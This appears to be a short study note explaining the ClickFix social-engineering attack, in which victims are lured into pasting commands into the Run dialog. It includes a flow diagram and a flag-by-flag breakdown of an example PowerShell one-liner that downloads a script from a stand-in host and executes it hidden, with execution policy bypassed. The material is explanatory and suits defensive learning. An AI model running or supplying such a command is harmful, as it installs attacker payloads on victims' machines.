ClickFix Attack ==> Full Process

  ClickFix:
    ClickFix is a SOcial Engineering driven + script based attack, in which the attacker lures the victim
    to executes malicious commands in (Run Dialog/Powershell/CMD Terminal)

===================================================
  Step-by-Step Flow:
===================================================

Fake website/email
      ↓
"Press Win + R"
      ↓
User pastes command
      ↓
PowerShell / CMD runs
      ↓
Downloader script executes
      ↓
Payload downloaded
      ↓
Payload executed
      ↓
Persistence + C2

Eg: Malicious Command:

  powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex"

Powershell       ==>  Launches/Run Powershell
-w hidden        ==>  Hides the window from user(user doesn't see anything)
-nop (-NoProfile)==> Do not load user profile, Avoid security scripts that are applied to the user
-ep bypass (-ExecutionPolicy Bypass) ==> Ignore powershell scrurity restricitions, Allow unsigned scripts (Normally windows blocks unknown scripts)
-c""  [ where c is command ]         ==> run whatever is there in strings
iwr [invoke-WebRequest]              ==> Fetch data/information  [ similar to curl/wget]
|                                    ==> Take output of first command & send it to Next command
Eg: iwr http://bad.site/script.ps1 | iex
  Download script & Immediately execute it
iex (Invoke-Expression)              ==> Execute command received



Real ClickFix Command Looks like
    powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex"

Meaning:
  Run in Powershell in hidden window & do not load user profile & bypass  execution policy checks,
  fetch payload.ps1 from bad.site then execute immediately

